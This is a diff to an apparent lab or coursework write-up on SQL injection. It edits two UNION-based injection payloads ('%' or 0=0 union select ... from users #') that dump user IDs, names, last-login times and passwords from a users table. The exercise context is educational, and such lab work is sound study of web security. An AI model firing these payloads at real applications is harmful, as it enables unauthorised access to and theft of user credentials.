@@ -60,7 +60,7 @@ We have chosen to retrieve the following fields: user_id, user, first_name, last
 Here is the query used 
 
 ```
-%' or 0=0 union select 'user_id|user|first_name|last_name|last_login|password)', concat(user_id,'|',user, '|', first_name, '|', last_name, '|', last_login, '|', password) from users #
+%' or 0=0 union select 'user_id|user|first_name|last_name|last_login|password', concat(user_id,'|',user, '|', first_name, '|', last_name, '|', last_login, '|', password) from users #
 ```
 
 And here is the result
@@ -108,7 +108,7 @@ We have already done so in answer 2.2.2 and here is the query we used
 We used this query to get the usernames and passwords of the users 
 
 ```
-%' or 0=0 union select 'first_name|last_name|password)', concat(first_name, '|', last_name, "|", password) from users #
+%' or 0=0 union select 'user|password', concat(user, '|', password) from users #
 ```
 
 Result:
